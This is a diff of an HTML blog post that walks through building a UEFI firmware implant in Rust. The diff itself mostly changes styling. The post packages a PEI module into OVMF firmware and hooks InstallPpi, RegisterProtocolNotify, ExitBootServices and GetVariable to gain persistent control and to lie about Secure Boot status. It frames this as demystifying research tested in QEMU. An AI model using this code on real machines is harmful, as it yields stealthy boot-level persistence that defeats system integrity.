@@ -1,19 +1,29 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+
     <title>UEFI APT? UEFI APT!</title>
-</head>
-<style>
-@import url('https://fonts.googleapis.com/css2?family=Fira+Mono&display=swap');
+    <meta name="description" content="" />
+    <meta property="og:title" content="UEFI APT? UEFI APT!" />
+    <meta property="og:description" content="" />
+    <meta property="og:type" content="article" />
+
+    <style>
+    @font-face {
+    font-family: "Fira Mono";
+    src: url("/assets/fonts/FiraMono-Regular.woff2") format("woff2");
+    font-weight: normal;
+    font-style: normal;
+}
 
 footer {
     font-size: 0.7em;
 }
 
 body {
-    font: 1em "Times New Roman", serif;
+    font: 1em "Helvetica", "Arial", sans-serif;
     overflow-y: scroll;
     overflow-wrap: normal;
     max-width: 100ch;
@@ -52,9 +62,7 @@ img {
 }
 
 pre, code {
-    font-size: 0.9em;
     font-family: 'Fira Mono', monospace;
-    background-color: #efefef;
 }
 
 nav ul {
@@ -72,11 +80,15 @@ nav ul li {
 
 blockquote {
     margin-left: 5px;
-    padding-left: 15px;
-    border-left: 3px solid #ccc;
+    padding: 1vh 1vw;
+    border-top-right-radius: 5px;
+    border-bottom-right-radius: 5px;
+    border-left: 5px solid #ababab;
+    background-color: #e2e0e0;
 }
 
-</style>
+    </style>
+</head>
 <body>
 <nav>
     <ul>
@@ -85,8 +97,7 @@ blockquote {
     </ul>
 </nav>
 <h1>UEFI APT? UEFI APT!</h1>
-<article><p>This is a bit of a rage post because I keep reading articles and reports
-overhyping “APT” capabilities writing UEFI persistent malware. The main
+<article>overhyping “APT” capabilities writing UEFI persistent malware. The main
 takeaway I want readers to get from this post is that <strong>UEFI is not magic;
 you can write UEFI malware in an afternoon.</strong> This article will <em>not</em> be
 covering how to bypass Secure Boot, Intel Boot Guard or whichever
@@ -130,7 +141,7 @@ properties:</p>
 <li>No SSE/AVX/MMX and floating point</li>
 </ul>
 <p>We can accomplish this with a Cargo build profile:</p>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="color:#323232;">{
 </span><span style="color:#323232;">    </span><span style="font-weight:bold;color:#183691;">&quot;llvm-target&quot;</span><span style="color:#323232;">: &quot;x86_64-unknown-windows&quot;,
 </span><span style="color:#323232;">    </span><span style="font-weight:bold;color:#183691;">&quot;arch&quot;</span><span style="color:#323232;">: &quot;x86_64&quot;,
@@ -167,9 +178,9 @@ properties:</p>
 </span><span style="color:#323232;">    </span><span style="font-weight:bold;color:#183691;">&quot;emit-debug-gdb-scripts&quot;</span><span style="color:#323232;">: </span><span style="color:#0086b3;">false
 </span><span style="color:#323232;">}
 </span></pre>
-</code></pre>
+</code></code></pre>
 <p>and <code>.cargo/config</code> to remove Rust non-core <code>std</code>:</p>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="color:#323232;">[build]
 </span><span style="color:#63a35c;">target </span><span style="color:#323232;">= </span><span style="color:#183691;">&quot;x86_64-none-uefi.json&quot;
 </span><span style="color:#323232;">
@@ -177,15 +188,15 @@ properties:</p>
 </span><span style="color:#63a35c;">build-std </span><span style="color:#323232;">= [</span><span style="color:#183691;">&quot;core&quot;</span><span style="color:#323232;">, </span><span style="color:#183691;">&quot;compiler_builtins&quot;</span><span style="color:#323232;">]
 </span><span style="color:#63a35c;">build-std-features </span><span style="color:#323232;">= [</span><span style="color:#183691;">&quot;compiler-builtins-mem&quot;</span><span style="color:#323232;">]
 </span></pre>
-</code></pre>
+</code></code></pre>
 <p>and <code>Cargo.toml</code> section to keep the PEIM small:</p>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="color:#323232;">[profile.dev]
 </span><span style="color:#63a35c;">panic </span><span style="color:#323232;">= </span><span style="color:#183691;">&quot;abort&quot;
 </span><span style="color:#63a35c;">strip </span><span style="color:#323232;">= </span><span style="color:#183691;">&quot;symbols&quot;
 </span><span style="color:#63a35c;">opt-level </span><span style="color:#323232;">= </span><span style="color:#183691;">&quot;z&quot;
 </span></pre>
-</code></pre>
+</code></code></pre>
 <p>With these configurations, we can build a suitable PE32 image with the right
 properties using the standard Rust toolchain.</p>
 <h3>Scaffolding</h3>
@@ -205,7 +216,7 @@ all necessary data types and conform to all involved interfaces.</p>
 <p>The PEIM <code>EFI_PEIM_ENTR_POINT2</code> is invoked by the PEI dispatcher at boot:</p>
 <blockquote>
 <p><strong>Prototype</strong></p>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="font-weight:bold;color:#a71d5d;">typedef
 </span><span style="color:#323232;">EFI_STATUS
 </span><span style="color:#323232;">(EFIAPI </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">EFI_PEIM_ENTRY_POINT2) (
@@ -213,7 +224,7 @@ all necessary data types and conform to all involved interfaces.</p>
 </span><span style="color:#323232;">  IN </span><span style="color:#0086b3;">CONST</span><span style="color:#323232;"> EFI_PEI_SERVICES     </span><span style="font-weight:bold;color:#a71d5d;">**</span><span style="color:#323232;">PeiServices
 </span><span style="color:#323232;">  );
 </span></pre>
-</code></pre>
+</code></code></pre>
 <p><strong>Parameters</strong></p>
 <p><em>FileHandle</em>: Handle of the file being invoked.</p>
 <p><em>PeiServices</em>: Describes the list of possible PEI Services.</p>
@@ -221,7 +232,7 @@ all necessary data types and conform to all involved interfaces.</p>
 <p>The <code>EFI_PEI_SERVICES</code> defines a set of services usable by PEIMs (analogous to
 <code>EFI_RUNTIME_SERVICES</code> and <code>EFI_BOOT_SERVICES</code>). We have to define the struct
 so we can use the function pointers passed to the entrypoint.</p>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="color:#323232;">#[repr(C)]
 </span><span style="font-weight:bold;color:#a71d5d;">pub struct </span><span style="color:#323232;">PeiServices {
 </span><span style="color:#323232;">    header: TableHeader,
@@ -238,10 +249,10 @@ so we can use the function pointers passed to the entrypoint.</p>
 </span><span style="color:#323232;">    ...
 </span><span style="color:#323232;">}
 </span></pre>
-</code></pre>
+</code></code></pre>
 <p>Now we can invoke PEI services. For example, we can get the <code>EFI_BOOT_MODE</code> of
 the current invocation with the following.</p>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="font-weight:bold;color:#a71d5d;">fn </span><span style="font-weight:bold;color:#795da3;">get_boot_mode</span><span style="color:#323232;">(svc: </span><span style="font-weight:bold;color:#a71d5d;">&amp;&amp;mut</span><span style="color:#323232;"> PeiServices) -&gt; BootMode {
 </span><span style="color:#323232;">    </span><span style="font-weight:bold;color:#a71d5d;">let mut</span><span style="color:#323232;"> boot_mode </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">BootMode::FullConfig;
 </span><span style="color:#323232;">    </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(svc.get_boot_mode)(svc, </span><span style="font-weight:bold;color:#a71d5d;">&amp;mut</span><span style="color:#323232;"> boot_mode) </span><span style="font-weight:bold;color:#a71d5d;">!= </span><span style="color:#323232;">EfiStatus::Success {
@@ -250,7 +261,7 @@ the current invocation with the following.</p>
 </span><span style="color:#323232;">    boot_mode
 </span><span style="color:#323232;">}
 </span></pre>
-</code></pre>
+</code></code></pre>
 <p>The last bit of scaffolding is to get debug output. I chose to implement an
 identical interface to the <a href="https://docs.rs/log/latest/log/"><code>log</code></a> crate,
 wrapping UART, but you can use whatever.</p>
@@ -287,7 +298,7 @@ the file must be padded. For example, a PEIM will be stored as:</p>
 </ul>
 <p>The layout of <code>EFI_FFS_FILE_HEADER</code> is listed below (<code>IntegrityCheck</code> is a
 16-bit checksum).</p>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="font-weight:bold;color:#a71d5d;">typedef </span><span style="color:#0086b3;">UINT8 </span><span style="color:#323232;">EFI_FV_FILETYPE;
 </span><span style="color:#323232;">
 </span><span style="font-style:italic;color:#969896;">/* FFS File Type */
@@ -318,9 +329,9 @@ the file must be padded. For example, a PEIM will be stored as:</p>
 </span><span style="color:#323232;">
 </span><span style="font-style:italic;color:#969896;">/* EFI_FFS_FILE_HEADER2 has an extended Size for large files. */
 </span></pre>
-</code></pre>
+</code></code></pre>
 <p>The layout of <code>EFI_COMMON_SECTION_HEADER</code> is listed below.</p>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="font-weight:bold;color:#a71d5d;">typedef </span><span style="color:#0086b3;">UINT8 </span><span style="color:#323232;">EFI_SECTION_TYPE;
 </span><span style="color:#323232;">
 </span><span style="font-style:italic;color:#969896;">/* Encapsulation section Type values */
@@ -338,7 +349,7 @@ the file must be padded. For example, a PEIM will be stored as:</p>
 </span><span style="color:#323232;">    EFI_SECTION_TYPE    Type;
 </span><span style="color:#323232;">} EFI_COMMON_SECTION_HEADER;
 </span></pre>
-</code></pre>
+</code></code></pre>
 <p>Depending on the <code>Type</code> of the section, an additional header will follow the
 common header (e.g. <code>EFI_COMPRESSION_SECTION</code> which specifies the compression
 algorithm).</p>
@@ -362,7 +373,7 @@ FFS file to the parent FV. The FFS file must contain sections for:</p>
 <li><em>[optional]</em> version</li>
 </ul>
 <p>You will have to build the sections yourself but here is a peek at mine :)</p>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="color:#0086b3;">...
 </span><span style="font-style:italic;color:#969896;"># encapsulate PE32 image
 </span><span style="font-style:italic;color:#969896;"># the section size must be aligned for unknown reasons
@@ -404,7 +415,7 @@ FFS file to the parent FV. The FFS file must contain sections for:</p>
 </span><span style="font-weight:bold;color:#a71d5d;">with </span><span style="color:#62a35c;">open</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;payload.ffs&quot;</span><span style="color:#323232;">, </span><span style="color:#183691;">&quot;wb&quot;</span><span style="color:#323232;">) </span><span style="font-weight:bold;color:#a71d5d;">as </span><span style="color:#323232;">f:
 </span><span style="color:#323232;">    f.write(payload)
 </span></pre>
-</code></pre>
+</code></code></pre>
 <p>After appending the file to the FV, all parent sections and FVs must be updated
 to include the size of our file (this is recursive). An additional constraint
 is that we must ensure the file alignment is preserved after inserting a new
@@ -413,15 +424,15 @@ you can either write a script to parse FFS yourself or use UEFITool. If you
 choose to write your own script, section 2.2 of the PI spec describes routines
 for modifying files then verifying FV images. Otherwise, UEFITool can insert
 files interactively or update FVs programmatically using <code>uefireplace</code>.</p>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="color:#323232;">$ uefireplace $FV/OVMF_CODE.fd $(cat uuid) 10 $TARGET </span><span style="color:#0086b3;">1</span><span style="font-weight:bold;color:#a71d5d;">&gt;</span><span style="color:#323232;">/dev/null
 </span></pre>
-</code></pre>
+</code></code></pre>
 <p>This replaces the file with the given UUID with the target file (containing an
 executable) which is detected by PEI core then dispatched.</p>
 <h3>Loading Images</h3>
 <p>The OVMF image can be directly loaded by QEMU for debugging.</p>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="font-style:italic;color:#969896;">#!/usr/bin/env </span><span style="font-style:italic;color:#0086b3;">sh
 </span><span style="color:#323232;">set -euo </span><span style="color:#0086b3;">1</span><span style="font-weight:bold;color:#a71d5d;">&gt;</span><span style="color:#323232;">/dev/null
 </span><span style="color:#323232;">
@@ -440,7 +451,7 @@ executable) which is detected by PEI core then dispatched.</p>
 </span><span style="color:#323232;">    -debugcon file:debug.log -global isa-debugcon.iobase=0x402 \
 </span><span style="color:#323232;">    -monitor none -serial stdio
 </span></pre>
-</code></pre>
+</code></code></pre>
 <p>We have enabled the GDB server, serial output, and disabled graphics in a handy
 debug script.</p>
 <h2>Abusing Pre-EFI Initialisation (PEI)</h2>
@@ -460,7 +471,7 @@ installs an interface in the PEI PPI database by GUID. The purpose of the
 service is to publish an interface that other parties can use to call
 additional PEIMs.</p>
 <p><strong>Prototype</strong></p>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="font-weight:bold;color:#a71d5d;">typedef
 </span><span style="color:#323232;">EFI_STATUS
 </span><span style="color:#323232;">(EFIAPI </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">EFI_PEI_INSTALL_PPI) (
@@ -468,7 +479,7 @@ additional PEIMs.</p>
 </span><span style="color:#323232;">  IN </span><span style="color:#0086b3;">CONST</span><span style="color:#323232;"> EFI_PEI_PPI_DESCRIPTOR     </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">PpiList
 </span><span style="color:#323232;">  );
 </span></pre>
-</code></pre>
+</code></code></pre>
 <p><strong>Parameters</strong></p>
 <p><em>PeiServices</em>: An indirect pointer to the <code>EFI_PEI_SERVICES</code> table published
 by the PEI Foundation.</p>
@@ -478,7 +489,7 @@ by the PEI Foundation.</p>
 <code>EFI_PEI_END_OF_PEI_PHASE</code>, a PPI used to indicate the end of the PEI phase. It
 is an optional PPI so an alternative mechanism is to hook <code>EFI_DXE_IPL_PPI</code> to
 control the discovery of the DXE Foundation.</p>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="font-weight:bold;color:#a71d5d;">pub unsafe fn </span><span style="font-weight:bold;color:#795da3;">hook_dxe_core</span><span style="color:#323232;">(svc: </span><span style="font-weight:bold;color:#a71d5d;">&amp;mut</span><span style="color:#323232;"> PeiServices) -&gt; Result&lt;(), EfiStatus&gt; {
 </span><span style="color:#323232;">    </span><span style="font-style:italic;color:#969896;">// DxeCore signals the end of PEI by installing the EFI_DXE_IPL_PPI PPI.
 </span><span style="color:#323232;">    </span><span style="font-style:italic;color:#969896;">// By hooking InstallPpi, we can locate DxeCore by waiting for this PPI.
@@ -519,7 +530,7 @@ control the discovery of the DXE Foundation.</p>
 </span><span style="color:#323232;">    }}
 </span><span style="color:#323232;">}
 </span></pre>
-</code></pre>
+</code></code></pre>
 <p>This hook scans the list of PPIs to be installed to find our target GUID. If
 the GUID is present then we have interrupted DXE core.</p>
 <h3>Hooking Service Tables</h3>
@@ -535,7 +546,7 @@ PHIT HOB describes a region of tested memory (i.e. stable and reliable memory)
 which the DXE Foundation can use to read the HOB List. The PHIT is laid out as
 follows.</p>
 <blockquote>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="font-weight:bold;color:#a71d5d;">typedef struct</span><span style="color:#323232;"> _EFI_HOB_HANDOFF_INFO_TABLE {
 </span><span style="color:#323232;">    EFI_HOB_GENERIC_HEADER  Header;
 </span><span style="color:#323232;">    </span><span style="color:#0086b3;">UINT32</span><span style="color:#323232;">                  Version;
@@ -547,14 +558,14 @@ follows.</p>
 </span><span style="color:#323232;">    EFI_PHYSICAL_ADDRESS    EfiEndOfHobList;
 </span><span style="color:#323232;">} EFI_HOB_HANDOFF_INFO_TABLE;
 </span></pre>
-</code></pre>
+</code></code></pre>
 </blockquote>
 <p>With the remaining HOBs directly following.</p>
 <p>The HOB list will include an <code>EFI_HOB_MEMORY_ALLOCATION</code> HOB which describes all
 memory ranges outside the HOB list (i.e. memory which DXE Foundation can
 allocate). Therefore, if we can find the region of memory usable by the DXE
 Foundation then we can infer where the service tables reside.</p>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="font-weight:bold;color:#a71d5d;">unsafe fn </span><span style="font-weight:bold;color:#795da3;">find_dxe_core_hob</span><span style="color:#323232;">(
 </span><span style="color:#323232;">    svc: </span><span style="font-weight:bold;color:#a71d5d;">&amp;&amp;mut</span><span style="color:#323232;"> PeiServices) -&gt; EfiResult&lt;</span><span style="background-color:#f5f5f5;font-weight:bold;color:#b52a1d;">*</span><span style="color:#323232;">const MemoryAllocationModule</span><span style="font-weight:bold;color:#a71d5d;">&gt; </span><span style="color:#323232;">{
 </span><span style="color:#323232;">    </span><span style="font-style:italic;color:#969896;">// Retrieve the final HOB list for all PEIMs.
@@ -595,13 +606,13 @@ Foundation then we can infer where the service tables reside.</p>
 </span><span style="color:#323232;">    </span><span style="color:#0086b3;">Err</span><span style="color:#323232;">(EfiStatus::NotFound)
 </span><span style="color:#323232;">}
 </span></pre>
-</code></pre>
+</code></code></pre>
 <p>We are cheating in this case since we are looking for memory allocation HOB
 belonging to the MdePkg DxeCore but a generic implant can scan all regions or
 intelligently figure out the GUID of the suspended DXE Foundation. Once we have
 the memory region containing the service tables, we can scan for the table
 signatures.</p>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="font-weight:bold;color:#a71d5d;">unsafe fn </span><span style="font-weight:bold;color:#795da3;">find_and_hook_services</span><span style="color:#323232;">(svc: PeiServicesPtr) -&gt; EfiResult&lt;()&gt; {
 </span><span style="color:#323232;">    </span><span style="font-style:italic;color:#969896;">// DxeCore is mapped into the same address space so we can scan the HOBs
 </span><span style="color:#323232;">    </span><span style="font-style:italic;color:#969896;">// directly to find the boot, runtime, and system tables.
@@ -675,7 +686,7 @@ signatures.</p>
 </span><span style="color:#323232;">    </span><span style="color:#0086b3;">Err</span><span style="color:#323232;">(EfiStatus::NotFound)
 </span><span style="color:#323232;">}
 </span></pre>
-</code></pre>
+</code></code></pre>
 <p>We have hooked the service tables used by DxeMain. However, there is a
 problem, DxeMain copies these tables into a runtime memory pool which are
 later overwritten by DXE modules so any hooks in the PHIT tables will be
@@ -709,7 +720,7 @@ used by functions to wait for protocols is <code>RegisterProtocolNotify</code>.<
 <p>Creates an event that is to be signaled whenever an interface is installed for
 a specific protocol.</p>
 <p><strong>Prototype</strong></p>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="font-weight:bold;color:#a71d5d;">typedef
 </span><span style="color:#323232;">EFI_STATUS
 </span><span style="color:#323232;">(EFIAPI </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">EFI_REGISTER_PROTOCOL_NOTIFY) (
@@ -718,13 +729,13 @@ a specific protocol.</p>
 </span><span style="color:#323232;">    OUT </span><span style="color:#0086b3;">VOID        </span><span style="font-weight:bold;color:#a71d5d;">**</span><span style="color:#323232;">Registration
 </span><span style="color:#323232;">);
 </span></pre>
-</code></pre>
+</code></code></pre>
 </blockquote>
 <p>MdePkg DxeCore calls <code>RegisterProtocolNotify</code> to determine when it can read the
 FV so it can dispatch DXE modules. By cheating, we know that MdePkg DxeCore
 will install the firmware volume protocol afer the runtime services and
 system table have been allocated in runtime pools.</p>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="font-weight:bold;color:#a71d5d;">extern </span><span style="color:#183691;">&quot;efiapi&quot; </span><span style="font-weight:bold;color:#a71d5d;">fn </span><span style="font-weight:bold;color:#795da3;">reg_proto_notify_hook</span><span style="color:#323232;">(
 </span><span style="color:#323232;">        guid: *const Guid, event: Cptr, reg: Cptr) -&gt; EfiStatus {
 </span><span style="color:#323232;">    </span><span style="font-weight:bold;color:#a71d5d;">const </span><span style="color:#0086b3;">FIRMWARE_VOLUME_2_PROTOCOL_GUID</span><span style="color:#323232;">: Guid
@@ -743,7 +754,7 @@ system table have been allocated in runtime pools.</p>
 </span><span style="color:#323232;">    </span><span style="font-weight:bold;color:#a71d5d;">unsafe </span><span style="color:#323232;">{ </span><span style="color:#0086b3;">ORIG_REG_PROTO_NOTIFY</span><span style="color:#323232;">(guid, event, reg) }
 </span><span style="color:#323232;">}
 </span></pre>
-</code></pre>
+</code></code></pre>
 <p>Now we have interrupted DXE Foundation after the tables have been relocated
 and before any other DXE Modules are launched. We can start looking for the
 tables.</p>
@@ -772,7 +783,7 @@ candidates pass these checks then we have found our tables which we can hook.</p
 <p>The hooks are straightforward to implement by overwriting table entries. The
 reference implementation hooks <code>ExitBootServices</code> but a more interesting
 target is <code>GetVariable</code> so we can lie about the presence of Secure Boot.</p>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="color:#323232;">fn </span><span style="font-weight:bold;color:#795da3;">locate_and_hook_tables</span><span style="color:#323232;">() -&gt; EfiStatus {
 </span><span style="color:#323232;">    </span><span style="font-weight:bold;color:#a71d5d;">if</span><span style="color:#323232;"> let Some((st, rt)) </span><span style="font-weight:bold;color:#a71d5d;">=</span><span style="color:#323232;"> unsafe { hunt_for_tables() } {
 </span><span style="color:#323232;">        info</span><span style="font-weight:bold;color:#a71d5d;">!</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;found referential pair of UEFI tables, all tables found&quot;</span><span style="color:#323232;">);
@@ -799,11 +810,11 @@ target is <code>GetVariable</code> so we can lie about the presence of Secure Bo
 </span><span style="color:#323232;">    unsafe { ORIG_EXIT_BOOT_SERVICES(img, key) }
 </span><span style="color:#323232;">}
 </span></pre>
-</code></pre>
+</code></code></pre>
 <p>With the hooks, you can control DXE and the OS as you please.</p>
 <h2>Conclusion</h2>
 <p>We pwn3d UEFI!!!111!</p>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="color:#323232;">[OK] loaded PigPEI
 </span><span style="color:#323232;">[??] hooking InstallPpi in EFI_PEI_SERVICES
 </span><span style="color:#323232;">[OK] trapped DxeLoadCore before DxeCore is called
@@ -832,7 +843,7 @@ target is <code>GetVariable</code> so we can lie about the presence of Secure Bo
 </span><span style="color:#323232;">[OK] installing gBS-&gt;ExitBootServices hook
 </span><span style="color:#323232;">[OK] removing gBS-&gt;RegisterProtocolNotify hook
 </span></pre>
-</code></pre>
+</code></code></pre>
 <h2>References</h2>
 <ul>
 <li><a href="https://uefi.org/specifications">UEFI Platform Initialization Specification Version 1.8</a></li>
